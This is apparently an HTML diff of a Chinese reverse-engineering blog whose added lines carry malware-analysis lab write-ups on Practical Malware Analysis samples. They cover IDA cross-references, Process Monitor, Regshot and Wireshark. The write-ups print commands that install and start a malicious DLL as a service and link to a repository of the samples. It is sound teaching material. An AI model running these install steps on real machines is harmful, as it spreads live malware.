+<p>接着就是用控制命令，远程创建cmd命令来达到执行Shell的目的。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816131140522-831968227.png" alt="image-20210816131140039"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816132028053-1280503178.png" alt="image-20210816132027587"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816132157816-39449530.png" alt="image-20210816132157267"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816132317738-927087262.png" alt="image-20210816132317331"> </p>
+<h3 id="题目9：进阶分析"><a href="#题目9：进阶分析" class="headerlink" title="题目9：进阶分析"></a>题目9：进阶分析</h3><p>在同一的区域，在0x100101C8处，看起来好像是dword_1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？(提示：使用dword_1008E5C4的交叉引用。)</p>
+<p>跳转到地址，然后点击全局变量，在全局变量位置处按<code>ctrl+x</code>调出交叉引用，然后可以看到有w 和r两种属性，其中我们可以知道w就是写入属性，而题目中需要我们来<code>cmp</code>走哪条分支，还有如何设置dword_1008E5C4全局变量，那么肯定是要看w属性看是什么东西写入到了全局变量<code>dword_1008E5C4</code>。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816133055623-349433222.png" alt="image-20210816133055222"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816133213759-1353706750.png" alt="image-20210816133213139"> </p>
+<p>可以看到代码处是eax复制给了全局变量<code>dword_1008E5C4</code>,而eax来源于上一句call的返回值，所以我们需要继续跟入Call来看他的返回值是什么？</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816133907565-694390482.png" alt="image-20210816133907012"> </p>
+<p>sub_10003695函数功能是获取系统版本信息，并且判断系统版本是否为NT系统，如果是返回true,否则返回false。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816134131910-2118603059.png" alt="image-20210816134131308"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816134331286-1820477811.png" alt="image-20210816134330714"> </p>
+<p>根据上面的分析我们可以得出结论，dword_1008E5C4的值应该是true也就是不为0，所以他不会跳转到loc_1001d7处，而是继续执行”cmd.exe /c”处。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816134725363-900334664.png" alt="image-20210816134724611"> </p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这一节我们学习了IDA Pro的很多知识，主要学会了IDA Pro</p>
+<ul>
+<li>文本视图和界面视图的切换（用空格按键）</li>
+<li>在界面视图显示地址</li>
+<li>查看IDA Pro的导入表窗口</li>
+<li>交叉引用，查看被多少处函数调用(ctrl + x)</li>
+<li>地址的跳转(ctrl + g)</li>
+<li>函数内局部变量的分析（带负号的）</li>
+<li>函数参数分析(push xx,call xxx)、(正数的)</li>
+<li>Strings 字符串窗口的查看(shift + f12)</li>
+<li>代码分析(f5)</li>
+<li>静态分析流程分支，追溯(利用ctrl +x) 看w和r属性，分析函数返回值</li>
+</ul>
+<p>欢迎加入QQ群：研究逆向、PWN、WEB安全、物联网安全</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816153759717-1095225742.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>
+
+      
+    </div>
+
     
     
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/10/MalwareAnalysis/3.DynamicBasic/" target="_self">
-          恶意代码分析实战三：动态分析基础技术
-        </a>
-      </h1>
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
-      <p class="index-excerpt">
-        <a href="/2021/08/10/MalwareAnalysis/3.DynamicBasic/" target="_self">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2021/08/10/MalwareAnalysis/3.DynamicBasic/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
+            <a href="/2021/08/10/MalwareAnalysis/3.DynamicBasic/" class="post-title-link" itemprop="url">恶意代码分析实战三：动态分析基础技术</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-10 18:04:20" itemprop="dateCreated datePublished" datetime="2021-08-10T18:04:20+08:00">2021-08-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-16 19:03:37" itemprop="dateModified" datetime="2021-08-16T19:03:37+08:00">2021-08-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PC%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">PC逆向</span></a>
+                </span>
+            </span>
+
           
-            
-          
-           
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <meta name="referrer" content="no-referrer"/> 
 这节课主要是通过以下的例子，学会如何使用动态分析基础技术的一些工具。
 
+<ul>
+<li>Process Monitor</li>
+<li>Process Explorer</li>
+<li>WireShark</li>
+<li>Regshot</li>
+<li>rundll32</li>
+<li>net start 命令</li>
+</ul>
+<h2 id="实验一："><a href="#实验一：" class="headerlink" title="实验一："></a>实验一：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab03-01.exe</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">使用工具：</span><br><span class="line">1. Process Explorer</span><br><span class="line">2. Strings</span><br><span class="line">3. Process Monitor</span><br><span class="line">4. StudyPE</span><br><span class="line">5. WireShark</span><br><span class="line"></span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、找出这个恶意代码的导入函数与字符串列表？</span><br><span class="line">2、这个恶意代码在主机上的感染特征是什么？</span><br><span class="line">3、这个恶意代码是否存在一些有用的网络特征码？如果存在，他们是什么？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure>
 
-Process Monitor
-Process Explorer
-WireShark
-Regshot
-rundll32
-net start 命令
+<h3 id="题目1解答："><a href="#题目1解答：" class="headerlink" title="题目1解答："></a>题目1解答：</h3><p>导入表里面只有一个API函数，<code>ExitProcess</code>退出进程相关的api函数。</p>
+<p>所以这个程序有可能的功能是打开后就退出。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164303446-2004223255.png" alt="image-20210813130730115"> </p>
+<p>查看字符串发现有几处可疑的地方：一个网址、三个注册表值，其中一个注册表值还是自启动的注册表键值。</p>
+<p>说明恶意程序有可能会打开这个恶意网址，并且添加到自启动。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164310606-1730778422.png" alt="image-20210813131229616"> </p>
+<h3 id="题目2解答："><a href="#题目2解答：" class="headerlink" title="题目2解答："></a>题目2解答：</h3><p>题目2中问了<code>这个恶意代码在主机上的感染特征是什么？</code>，那么我们只靠静态分析是看不出来的，这时候就用到了动态分析的基础技术了。</p>
+<h4 id="Process-Explorer"><a href="#Process-Explorer" class="headerlink" title="Process Explorer"></a>Process Explorer</h4><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164313808-486290819.png" alt="image-20210813132112725"> </p>
+<p>需要注意的是这里创建了一个互斥量<code>WinVMX32</code>。</p>
+<p>恶意程序经常会创建互斥量，也为这样的话他就可以对计算机中的某个资源在同一时刻只有一个对象对其进行访问。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164318186-1762604630.png" alt="image-20210813132259382"> </p>
+<p>接着再来看看DLL，操作方法和上面的Handles一样。</p>
+<p>值得注意的是标红色标记那里，他调用了ws2_32.dll，说明这个程序他有网络通讯的功能。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164322850-18974552.png" alt="image-20210813132645985"> </p>
+<h4 id="Process-Monitor"><a href="#Process-Monitor" class="headerlink" title="Process Monitor"></a>Process Monitor</h4><p>打开Process Monitor选择过滤器，过滤掉不必要的进程信息。</p>
+<p> <img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164326495-525036889.png" alt="image-20210813131939272"> </p>
+<p>可以看到<code>Process Monitor</code>帮我们监控到了很多信息，但是我们不需要这么多信息，我们只关心我们需要关注的操作。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164329826-657515794.png" alt="image-20210813132924446"> </p>
+<p>对其就行行为<code>WriteFile</code>和<code>RegSetValue</code>进行过滤，分别的功能是写入文件和注册表操作。</p>
+<p>过滤后看图2，发现监控到3处敏感地方：</p>
+<ol>
+<li>程序在<code>windows\system32</code>出写出了文件<code>vmx32to64.exe</code></li>
+<li>程序添加了自启动注册表值<code>CurrenVersion\Run\VideoDriver</code></li>
+<li>程序操作了随机数，注册表值<code>RNG\Seed</code></li>
+</ol>
+<p>用Process Monitor分析后可知该恶意程序会添加自启动，会写出文件到系统目录，会操作随机数。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164334285-976116684.png" alt="image-20210813133217400"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164339421-1107910108.png" alt="image-20210813141613537"> </p>
+<h4 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h4><p>wireshark打开后，直接监听网卡流量即可。</p>
+<p>WireShark监控中看到有DNS协议，恶意软件解析了域名<code>www.practicalmalwareanalysis.com</code>。</p>
+<p>监控到SSL协议，发送了256字节的随机乱码数据。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164341681-1188606964.png" alt="image-20210813142249004"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164345080-1006470898.png" alt="image-20210813142541906"> </p>
+<h3 id="实验一总结："><a href="#实验一总结：" class="headerlink" title="实验一总结："></a>实验一总结：</h3><p>我们通过了使用Process Monitor和Process Explorer与WireShark等动态监控的软件对实验一进行了分析，并且得出如下结论：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lab03-01.exe会创建互斥量，会将自身拷贝到系统\Windows\system32\vmx32to64.exe中，恶意程序会创建启动项，恶意程序还会有网络通讯功能，访问www.practicalmalwareanalysis.com并且发送随机的256字节乱码数据。</span><br></pre></td></tr></table></figure>
 
-实验一：1234567891011121314151617----------------Lab03-01.exe----------------使用工具：1. Proces
-        </a>
-      </p>
 
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-10 18:04" pubdate>
-              2021-08-10
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/PC%E9%80%86%E5%90%91/">PC逆向</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/">恶意代码分析系列</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
 
-  <div class="row mx-auto index-card">
+<h2 id="实验二：动态分析不可运行的DLL"><a href="#实验二：动态分析不可运行的DLL" class="headerlink" title="实验二：动态分析不可运行的DLL"></a>实验二：动态分析不可运行的DLL</h2><p><code>.dll，动态链接库英文为DLL，是Dynamic Link Library的缩写。</code></p>
+<p>由于DLL不能像EXE那样单独运行，他需要由EXE来装载动态调用，下面我们就来介绍如何对DLL进行动态分析。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab03-02.dll</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">使用工具：</span><br><span class="line">1. Process Explorer</span><br><span class="line">2. Strings</span><br><span class="line">3. Process Monitor</span><br><span class="line">4. StudyPE</span><br><span class="line">5. WireShark</span><br><span class="line">6. Regshot</span><br><span class="line"></span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、你怎么样让这个恶意代码自行安装？</span><br><span class="line">2、在安装之后，你如何让这个恶意代码运行起来？</span><br><span class="line">3、你怎么能找到这个恶意代码是在哪个进程下运行的？</span><br><span class="line">4、你可以在Process Monitor工具中设置什么样的过滤器，才能收集这个恶意代码的信息？</span><br><span class="line">5、这个恶意代码在主机上的感染迹象特征是什么？</span><br><span class="line">6、这个恶意代码是否存在一些有用的网络特征码</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们带着题目中的6个疑问来进行分析。</p>
+<h3 id="题目1：让恶意代码自行安装"><a href="#题目1：让恶意代码自行安装" class="headerlink" title="题目1：让恶意代码自行安装"></a>题目1：让恶意代码自行安装</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>这里和之前分析EXE时候有些不一样的地方，之前我们都是通过分析导入表看EXE引用了哪些api函数，而分析dll的时候会额外的多出一个<code>导出表</code>，顾名思义就是dll导出了他的函数，供应加载他的exe去调用他，所以我们这里需要关注的点就是导出表中的函数。</p>
+<p>其中这里有5个导出函数，其中第二个和第三个导出函数猜测应该是和服务相关，那么这个dll可能会创建一个服务，而第四个是installA有可能该dll通过此dll进行安装。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164351088-1630329337.png" alt="image-20210813144324734"> </p>
+<p>那么我们继续看导入表，看看该dll调用了哪些api函数。</p>
+<p>其中<code>Reg</code>带头的都是注册表相关的api函数，带Service的是服务相关的api函数，那么我们就可以说此dll具有操作注册表和服务相关的功能。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164354565-1341149723.png" alt="image-20210813144659756"> </p>
+<p>继续看，该dll还具有操作http相关的功能。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164358379-1803210353.png" alt="image-20210813145047850"> </p>
+<p>在其字符串中有出现网址，并且有出现<code>svchost</code>,这是Windows的一个宿主程序，有许多的系统dll都附着在该程序中运行，所以本次使用目的有可能也是需要通过附着到svchost上到达代码运行的效果。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164402093-1467074975.png" alt="image-20210813145415001"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164406913-173977676.png" alt="image-20210813145523398"> </p>
+<h4 id="让恶意代码自行安装"><a href="#让恶意代码自行安装" class="headerlink" title="让恶意代码自行安装"></a>让恶意代码自行安装</h4><p>在静态分析中，我们得到了导出函数中有一个<code>installA</code>函数，所以我们这里大胆猜测是用这个函数进行dll的安装。</p>
+<p>那么在Windows系统中有这么一个程序<code>rundll32.exe</code>， 专门用来安装dll程序的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#命令行</span></span><br><span class="line">rundll32.exe Lab03-02.dll,installA</span><br></pre></td></tr></table></figure>
+
+<p>这里先不急着运行，因为我们运行后也看不到任何结果，而我们这里主要关注下其文件对注册表进行了哪些修改，所以我们需要用到<code>Regshot</code>工具。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164409958-1259230648.png" alt="image-20210813151031718"> </p>
+<p>恶意程序添加了一个名为<code>IPRIP</code>的服务，并且服务显示名与描述信息如第二处标红位置。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164412555-1032083246.png" alt="image-20210813151122548"> </p>
+<h3 id="题目2：运行恶意代码"><a href="#题目2：运行恶意代码" class="headerlink" title="题目2：运行恶意代码"></a>题目2：运行恶意代码</h3><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164415609-1752316468.png" alt="image-20210813151233979"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164417978-789580048.png" alt="image-20210813151345696"> </p>
+<p>然后你可以点击上面的启动来运行dll，当然也可以用如下的命令进行服务的启动。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#命令行</span></span><br><span class="line">net start IPRIP</span><br></pre></td></tr></table></figure>
+
+<h3 id="题目3：找到恶意代码附着的进程"><a href="#题目3：找到恶意代码附着的进程" class="headerlink" title="题目3：找到恶意代码附着的进程"></a>题目3：找到恶意代码附着的进程</h3><p>在<code>Process Explorer</code>中点击Find菜单，并且输入需要查找的dll回车后即可得到dll附加进程的信息。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164420561-552297810.png" alt="image-20210813152245120"> </p>
+<h3 id="题目4：Process-Monitor设置过滤dll监控"><a href="#题目4：Process-Monitor设置过滤dll监控" class="headerlink" title="题目4：Process Monitor设置过滤dll监控"></a>题目4：Process Monitor设置过滤dll监控</h3><p>因为dll是需要exe加载运行，所以我们设置Process Name为dll名字是无效的,而我们这里的Process Name是<code>svchost.exe</code>，但是系统中有很多的svchost.exe导致我们不好定位，这里解决的办法是得到进程的pid如上图<code>1108</code></p>
+<p><code>我们先运行Process Monitor然后再启动服务，最后在进行如下数据的过滤。</code></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164422722-1183301009.png" alt="image-20210813153418421"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164425285-1353752672.png" alt="image-20210813153358434"> </p>
+<h3 id="题目5：感染迹象特征"><a href="#题目5：感染迹象特征" class="headerlink" title="题目5：感染迹象特征"></a>题目5：感染迹象特征</h3><p>程序会附着在系统进程<code>svchost.exe</code>中</p>
+<h3 id="题目6：网络特征"><a href="#题目6：网络特征" class="headerlink" title="题目6：网络特征"></a>题目6：网络特征</h3><p>解析域名，访问http</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164428405-1311404628.png" alt="image-20210813153913318"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164433470-1039749053.png" alt="image-20210813154004062"> </p>
+<h3 id="实验二总结："><a href="#实验二总结：" class="headerlink" title="实验二总结："></a>实验二总结：</h3><p>通过实验二，我们知道了用rundll32.exe来安装dll，知道了<code>svchost.exe</code>可以让dll附着并运行服务，还知道了Process Monitor可以用过用pid的方式来过滤我们想要的dll监控数据。</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>在动态分析基础技术中的实验，我们学习到了如下技能</p>
+<ul>
+<li>Process Monitor可以用来监控程序的行为</li>
+<li>Process Explorer可以用来查看进程的信息</li>
+<li>WireShark可以抓到应用程序的网络流量包</li>
+<li>Regshot可以对比程序运行前后的注册表值</li>
+<li>rundll32.exe 可以用来安装dll</li>
+<li>svchost.exe 即服务可以用来运行dll，或附着dll。</li>
+</ul>
+<p>欢迎加入QQ群：研究逆向、PWN、WEB安全、物联网安全</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816153728237-773892030.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>
+
+      
+    </div>
+
     
     
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/09/MalwareAnalysis/2.StaticBasic/" target="_self">
-          恶意代码分析实战二：静态分析基础技术
-        </a>
-      </h1>
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
-      <p class="index-excerpt">
-        <a href="/2021/08/09/MalwareAnalysis/2.StaticBasic/" target="_self">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2021/08/09/MalwareAnalysis/2.StaticBasic/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
+            <a href="/2021/08/09/MalwareAnalysis/2.StaticBasic/" class="post-title-link" itemprop="url">恶意代码分析实战二：静态分析基础技术</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-09 18:02:30" itemprop="dateCreated datePublished" datetime="2021-08-09T18:02:30+08:00">2021-08-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-16 19:03:30" itemprop="dateModified" datetime="2021-08-16T19:03:30+08:00">2021-08-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PC%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">PC逆向</span></a>
+                </span>
+            </span>
+
           
-            
-          
-           
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <meta name="referrer" content="no-referrer"/> 
 我们主要通过以下的四个实验，来学习静态分析的基础技术，请大家务必完成每个实验中题目，这样才能得到有效的水平提升。
 
-实验中的工具或样本都可以在这里下载到：https://github.com/Vxer-Lee/MalwareAnalysis
-实验一：123456789101112131415161718----------------Lab01-01.exeLab01-01.dll------
-        </a>
-      </p>
+<p>实验中的工具或样本都可以在这里下载到：<a target="_blank" rel="noopener" href="https://github.com/Vxer-Lee/MalwareAnalysis">https://github.com/Vxer-Lee/MalwareAnalysis</a></p>
+<h2 id="实验一："><a href="#实验一：" class="headerlink" title="实验一："></a>实验一：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab01-01.exe</span><br><span class="line">Lab01-01.dll</span><br><span class="line">----------------</span><br><span class="line">使用工具：</span><br><span class="line">1. StudyPE+ x86</span><br><span class="line">2. Strings</span><br><span class="line">3. VirSCAN.org</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、将文件上传到http:&#x2F;&#x2F;www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？</span><br><span class="line">2、这些文件是什么时候编译的？</span><br><span class="line">3、这两个文件中是否存在迹象说明他们是否被加壳或混淆了？如果是，这些迹象在哪里？</span><br><span class="line">4、是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？</span><br><span class="line">5、是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？</span><br><span class="line">6、是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？</span><br><span class="line">7、你猜这些文件的目的是干什么的？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure>
 
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-09 18:02" pubdate>
-              2021-08-09
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/PC%E9%80%86%E5%90%91/">PC逆向</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
